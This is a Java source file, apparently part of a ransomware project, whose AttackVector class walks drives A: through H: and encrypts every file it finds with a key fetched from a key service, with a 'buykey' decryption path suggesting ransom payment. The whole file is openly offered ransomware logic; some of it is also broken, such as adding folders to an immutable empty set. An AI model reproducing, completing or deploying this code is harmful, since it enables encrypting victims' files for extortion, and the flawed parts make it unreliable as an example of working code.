package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector {

	private KeyService keyService;

	public void attack() throws RansomwareException {
		Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();

		Collection<File> visitedFolders = Collections.emptySet();

		// Default
		Cryptable cryptFunc = new EncryptFile();

		CryptoKey key = encryptionKey();
		// or
		key = decryptionKey(cryptFunc);
		for (char i = 'A'; i <= 'H'; i++) {
			try {
				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
			} catch (RansomwareException e) {
				throw new RansomwareException(e.getMessage(), e.getCause());
			}

		}
	}

	private CryptoKey encryptionKey() throws RansomwareException {
		try {
			return keyService.getKey();
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}
	}

	private CryptoKey decryptionKey(Cryptable cryptFunc) throws RansomwareException {

		cryptFunc = new DecryptFile();
		try {
			return keyService.buykey();
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}

	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
			Cryptable cryptoFunc) throws RansomwareException {

		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {

						cryptoFunc.doingCrypto(key, file, crypto);

					}
				}
			}

		}
	}
}
